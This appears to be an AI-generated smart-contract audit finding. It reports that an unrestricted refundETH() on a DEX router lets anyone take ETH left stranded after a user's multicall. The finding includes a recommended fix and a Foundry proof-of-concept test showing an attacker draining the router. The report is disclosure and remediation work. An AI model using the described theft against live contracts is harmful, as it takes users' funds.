The key code is already visible. Let me verify the `refundETH` access control and the `pay()` ETH consumption logic precisely.

The vulnerability is real. Here is the full analysis:

---

### Title
Unrestricted `refundETH()` allows any caller to steal excess ETH stranded on the router by a victim's incomplete `multicall` — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`refundETH()` sends the router's entire native ETH balance to `msg.sender` with no access control. When a user calls `multicall{value: V}` with `exactInputSingle({tokenIn: WETH, amountIn: A})` where `V > A` and omits a `refundETH()` sub-call, the `pay()` function consumes exactly `A` ETH (wrapping it to WETH) and leaves `V - A` ETH stranded on the router. Any subsequent caller can drain that ETH by calling `refundETH()` directly.

### Finding Description

**Step 1 — ETH stranding via `pay()`**

`pay()` in `PeripheryPayments` handles WETH input by consuming native ETH first: [1](#0-0) 

When `nativeBalance (V) >= value (A)`, it wraps exactly `A` ETH and sends it to the pool. The remaining `V - A` ETH stays on the router — there is no automatic refund.

**Step 2 — `multicall` does not enforce a refund**

`multicall` is a bare delegatecall loop with no post-execution ETH balance check: [2](#0-1) 

If the caller omits `refundETH()` from the call array, the excess ETH is silently left on the router.

**Step 3 — `refundETH()` has no access control**

`refundETH()` unconditionally transfers the full ETH balance to `msg.sender`: [3](#0-2) 

There is no check that `msg.sender` is the original depositor, no per-sender accounting, and no restriction to multicall context. Any EOA or contract can call it at any time.

### Impact Explanation
Direct, complete loss of the victim's excess ETH. The attacker needs only to observe the victim's transaction (mempool or on-chain) and call `refundETH()` in the next block. No privileged role, malicious pool, or non-standard token is required.

### Likelihood Explanation
ETH-input swaps via `multicall` are the documented usage pattern for native ETH swaps (the test suite explicitly demonstrates `multicall{value: msgValue}` with `refundETH` as the second call). Any user who follows the swap-only pattern without appending `refundETH()` — a realistic omission — loses the excess. MEV bots routinely monitor for stranded value on routers. [4](#0-3) 

### Recommendation
Add a post-execution ETH balance check inside `multicall` that automatically refunds any remaining ETH to `msg.sender`, or track the original depositor in transient storage and restrict `refundETH()` to that address within the same transaction. The simplest fix is to refund at the end of `multicall` unconditionally:

```solidity
function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
    // Auto-refund any unconsumed ETH to the original caller
    uint256 bal = address(this).balance;
    if (bal > 0) _transferETH(msg.sender, bal);
}
```

### Proof of Concept

```solidity
// Victim sends 100 ETH but only swaps 90
vm.deal(victim, 100 ether);
vm.prank(victim);
bytes[] memory calls = new bytes[](1); // no refundETH!
calls[0] = abi.encodeWithSelector(
    router.exactInputSingle.selector,
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: 90 ether,
        amountOutMinimum: 0,
        recipient: victim,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    })
);
router.multicall{value: 100 ether}(calls);

// 10 ETH is now stranded on the router
assertEq(address(router).balance, 10 ether);

// Attacker steals it
vm.prank(attacker);
router.refundETH();
assertEq(attacker.balance, 10 ether);
assertEq(address(router).balance, 0);
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-77)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L39-44)
```text
  function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
      results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
